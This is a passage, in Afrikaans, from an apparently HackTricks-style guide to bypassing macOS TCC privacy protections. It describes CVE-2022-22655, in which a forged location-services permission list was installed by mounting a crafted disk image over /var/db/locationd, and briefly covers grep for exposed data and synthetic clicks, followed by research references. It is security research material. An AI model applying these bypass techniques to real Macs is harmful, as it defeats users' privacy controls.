Die nutsding **`/usr/sbin/asr`** kon die hele skyf kopieer en dit op ’n ander plek mount, waardeur TCC-beskerming omseil is.

### CVE-2022-22655 - Liggingdienste

Liggingdienste word **nie** soos die ander dienste in ’n TCC-databasis gestoor nie. Hulle word deur `locationd` bestuur, wat sy eie toelaatlys in **`/var/db/locationd/clients.plist`** hou:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Elke inskrywing word geïdentifiseer deur die kliënt (bundle ID of uitvoerbare lêerpad) en bevat velde soos `Authorized`, `BundleId`, `Executable` en `Registered`.<sup>[[4]](#references)</sup>

Die `clients.plist`-lêer self word deur Sandbox/TCC beskerm en kan nie eens as root gewysig word nie — maar die **`/var/db/locationd/`-gids was nie teen montering beskerm nie**. ’n Aanvaller wat as root loop, kon dus ’n skyfbeeld bou wat hul eie `clients.plist` bevat (met hul binêre lêer as `Authorized` gemerk), dit oor die gids monteer en `locationd` herbegin sodat die vervalste toestemmingslys in werking tree.<sup>[[3]](#references)</sup>

> [!TIP]
> Dit is dieselfde patroon as die `hdiutil`/`mount` TCC-bypasses hierbo: die *lêer* word beskerm, maar die *gids waarin dit geleë is* nie, dus vervang jy die hele gids eerder as die lêer.

## Via opstartprogramme


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Via grep

In verskeie gevalle stoor lêers sensitiewe inligting soos e-posadresse, telefoonnommers, boodskappe... op onbeskermde plekke (wat volgens Apple as ’n kwesbaarheid tel).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Dit werk nie meer nie, maar [**dit het in die verlede gewerk**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Nog ’n manier deur [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) te gebruik:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: Om die macOS Transparency, Consent, and Control (TCC)-raamwerk te omseil](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Om macOS TCC-gebruikersprivaatheidsbeskerming per ongeluk en doelbewus te omseil](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Omseiling van TCC Location Services (oorspronklike verslag)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Waar in die wêreld is Carmen Sandiego: Misbruik van Location Services op macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC-bypass steel data van iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG-omgewingsveranderlikes)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Toestemming vir DYLD-omgewingsveranderlikes](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarisering: die hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-day TCC-bypass in XCSSET-wanware ontdek](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Wat op jou Mac gebeur, bly op Apple se iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Nuwe macOS-kwesbaarheid, "powerdir," kan tot ongemagtigde toegang tot gebruikersdata lei](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Verander die tuisgids en omseil TCC, oftewel CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Speel die musiek en omseil TCC, oftewel CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Hoe om ’n (Fire)fox te beroof](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Omseil TCC met Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Onthulling van Apple-kwesbaarhede: oudit van diskarbitrationd en storagekitd, Deel 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks en CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Stel omgewingsveranderlikes op OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC-bypass en voorregte-eskalasie](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC-bypass deur oor die TCC-databasis te monteer](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ maniere om jou macOS-privaatheidsmeganismes te omseil](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [’n Uitklophou teen TCC - 20+ NUWE maniere om jou macOS-privaatheidsmeganismes te omseil](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Van Spotlight tot Apple Intelligence — Misbruik van ’n 0day om die data te steel wat macOS AI aandryf](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
